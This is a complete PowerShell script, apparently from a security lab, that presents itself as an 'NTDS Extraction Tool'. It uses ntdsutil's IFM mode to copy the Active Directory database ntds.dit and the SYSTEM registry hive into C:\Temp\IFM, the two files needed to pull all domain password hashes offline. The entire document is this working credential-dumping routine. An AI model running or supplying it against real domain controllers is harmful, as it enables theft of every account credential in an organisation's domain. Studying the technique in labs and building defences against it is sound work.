# Acyber Lab - NTDS Backup Script (IFM Method)
Write-Host "##############################################"
Write-Host "#              Acyber Lab                   #"
Write-Host "#   --------------------------------------  #"
Write-Host "#   Welcome to the NTDS Extraction Tool    #"
Write-Host "#   Using ntdsutil for Stable Dump         #"
Write-Host "##############################################"

$ifmPath = "C:\Temp\IFM"

Write-Host "[*] Creating IFM backup via ntdsutil..."
if (!(Test-Path $ifmPath)) {
    New-Item -ItemType Directory -Path $ifmPath | Out-Null
}
Start-Process -FilePath "ntdsutil.exe" -ArgumentList '"ac i ntds" "ifm" "create full C:\Temp\IFM" q q' -Wait -NoNewWindow

$ntdsFile = "$ifmPath\Active Directory\ntds.dit"
$systemFile = "$ifmPath\registry\SYSTEM"

if ((Test-Path $ntdsFile) -and (Test-Path $systemFile)) {
    Write-Host "[+] Backup completed successfully!"
    Write-Host "[*] Files located in:"
    Write-Host "    NTDS:   $ntdsFile"
    Write-Host "    SYSTEM: $systemFile"
} else {
    Write-Host "[!] Backup failed or files not found."
}
